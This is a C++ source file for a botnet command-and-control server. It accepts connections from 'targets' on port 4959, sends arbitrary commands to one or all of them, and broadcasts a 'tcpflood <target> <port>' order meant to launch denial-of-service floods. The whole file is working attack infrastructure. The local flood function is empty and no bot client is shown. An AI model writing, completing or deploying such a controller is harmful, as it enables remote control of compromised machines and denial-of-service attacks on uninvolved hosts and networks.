#include <iostream>
#include <vector>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <poll.h>
#include <cstring>

void print_help() {
    std::cout << "\n=== COMMAND PALETTE ===\n"
              << "help           - Show this menu\n"
              << "list           - List all active client IDs\n"
              << "send <id> <c>  - Send command <c> to a specific client ID\n"
              << "exit           - Shutdown the C2 server\n"
              << "[any text]      - Broadcast command to ALL connected clients\n"
              << "=======================\n" << std::endl;
}

void print_methods() {
    std::cout << "========= METHODS ==========\n"
              << "tcpflood <target> <port>" << std::endl;
}

void tcpflood() {
    
}

int main() {
    // 1. Create server socket
    int sfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sfd < 0) {
        std::cerr << "[-] Error creating socket." << std::endl;
        return 1;
    }

    // Enable port reuse (prevents "Address already in use" on restarts)
    int opt = 1;
    setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(4959);

    // 2. Bind & Listen with precise error output
    if (bind(sfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        std::cerr << "[-] Bind failed (Port 4959 might be blocked): " << strerror(errno) << std::endl;
        std::cerr << "[!] Tip: Run 'fuser -k 4959/tcp' to free the port." << std::endl;
        close(sfd);
        return 1;
    }

    if (listen(sfd, 10) < 0) {
        std::cerr << "[-] Listen failed: " << strerror(errno) << std::endl;
        close(sfd);
        return 1;
    }

    // 3. Initialize I/O Multiplexing
    std::vector<pollfd> fds;
    fds.push_back({sfd, POLLIN, 0});      
    fds.push_back({STDIN_FILENO, POLLIN, 0});  

    std::cout << "[+] C2 Online. Type /help for Command Palette." << std::endl;
    std::cout << "c2> " << std::flush;

    while (true) {
        // Wait 5 seconds for events
        int ret = poll(fds.data(), fds.size(), 5000);
        if (ret < 0) break;

        // HEARTBEAT (Timeout after 5 seconds of inactivity)
        if (ret == 0) { 
            for (size_t i = 2; i < fds.size(); ++i) {
                if (send(fds[i].fd, "ping", 4, 0) < 0) {
                    std::cout << "\r[-] Client " << fds[i].fd << " lost (Heartbeat failed).\nc2> " << std::flush;
                    close(fds[i].fd);
                    fds.erase(fds.begin() + i--);
                }
            }
            continue;
        }

        // Process sockets and console input
        for (size_t i = 0; i < fds.size(); ++i) {
            if (!(fds[i].revents & POLLIN)) continue;

            // NEW CLIENT INCOMING
            if (fds[i].fd == sfd) { 
                int cfd = accept(sfd, nullptr, nullptr);
                if (cfd >= 0) {
                    fds.push_back({cfd, POLLIN, 0});
                    std::cout << "\r[+] New client connected! ID (Socket): " << cfd << "\nc2> " << std::flush;
                }
            } 
            // COMMAND INPUT (Your keyboard input)
            else if (fds[i].fd == STDIN_FILENO) { 
                std::string cmd;
                std::getline(std::cin, cmd);
                
                if (cmd.empty()) {
                    std::cout << "c2> " << std::flush;
                    continue;
                }

                if (cmd == "help") {
                    print_help();
                } 
                else if (cmd == "list") {
                    std::cout << "--- Active Targets ---" << std::endl;
                    for (size_t j = 2; j < fds.size(); ++j) {
                        std::cout << "[Target ID]: " << fds[j].fd << std::endl;
                    }
                    if (fds.size() <= 2) std::cout << "No targets connected." << std::endl;
                } 
                else if (cmd.rfind("send ", 0) == 0) { 
                    try {
                        size_t space1 = cmd.find(' ');
                        size_t space2 = cmd.find(' ', space1 + 1);
                        int target_id = std::stoi(cmd.substr(space1 + 1, space2 - space1 - 1));
                        std::string payload = cmd.substr(space2 + 1);
                        
                        bool found = false;
                        for (size_t j = 2; j < fds.size(); ++j) {
                            if (fds[j].fd == target_id) { found = true; break; }
                        }

                        if (found) {
                            send(target_id, payload.c_str(), payload.length(), 0);
                            std::cout << "[>] Sent to [" << target_id << "]: " << payload << std::endl;
                        } else {
                            std::cout << "[-] Error: ID " << target_id << " does not exist." << std::endl;
                        }
                    } catch (...) {
                        std::cout << "[-] Syntax: /send <id> <command>" << std::endl;
                    }
                } 
                else if (cmd == "exit") {
                    std::cout << "[!] Shutting down C2 server..." << std::endl;
                    // Close all active sockets before exiting
                    for (const auto& slot : fds) {
                        if (slot.fd >= 0) close(slot.fd);
                    }
                    return 0;
                }
                else if (cmd.rfind("tcpflood ", 0) == 0) {
                    std::cout << "c2> you selected [tcpflood]" << std::endl;
                    try {
                        size_t space1 = cmd.find(' ');
                        size_t space2 = cmd.find(' ', space1 + 1);

                        std::string protocol = cmd.substr(0, space1);
                        std::string ip = cmd.substr(space1 + 1, space2 - space1 - 1);
                        int port = std::stoi(cmd.substr(space2 + 1));
                        std::cout << protocol << std::endl; 
                        std::cout << ip << std::endl;       
                        std::cout << port << std::endl;
                        
                        for (size_t j = 2; j < fds.size(); ++j) {
                            send(fds[j].fd, cmd.c_str(), cmd.length(), 0);
                        }
                    }
                    catch (...) {
                        std::cout << "Syntax: tcp <ip> <port>" << std::endl;
                    }
                }
                else if (cmd == "clear") {
                    std::cout << "\r";
                }
                else if (cmd.rfind("ping ", 0) == 0) {
                                           size_t space1 = cmd.find(' ');
                        size_t space2 = cmd.find(' ', space1 + 1);

                        std::string method = cmd.substr(0, space1);
                        std::string ip = cmd.substr(space1 + 1, space2 - space1 - 1);
                        int port = std::stoi(cmd.substr(space2 + 1));
                        std::cout << method << std::endl; 
                        std::cout << ip << std::endl;       
                        // std::cout << port << std::endl;
                        
                        for (size_t j = 2; j < fds.size(); ++j) {
                            send(fds[j].fd, cmd.c_str(), cmd.length(), 0);
                        } 
                }
                
                std::cout << "c2> " << std::flush;
            } 
            // RECEIVE CLIENT DATA
            else { 
                char buf[1024] = {0};
                int bytes = recv(fds[i].fd, buf, 1023, 0);
                
                if (bytes > 0) {
                    // \r clears the current 'c2> ' prompt so incoming lines break cleanly
                    // std::cout << "\r[Client " << fds[i].fd << "]: " << buf << "\nc2> " << std::flush;
                } else {
                    std::cout << "\r[-] Client " << fds[i].fd << " disconnected.\nc2> " << std::flush;
                    close(fds[i].fd);
                    fds.erase(fds.begin() + i--);
                }
            }
        }
    }

    // Safety cleanup fallback
    for (const auto& slot : fds) {
        if (slot.fd >= 0) close(slot.fd);
    }
    return 0;
}
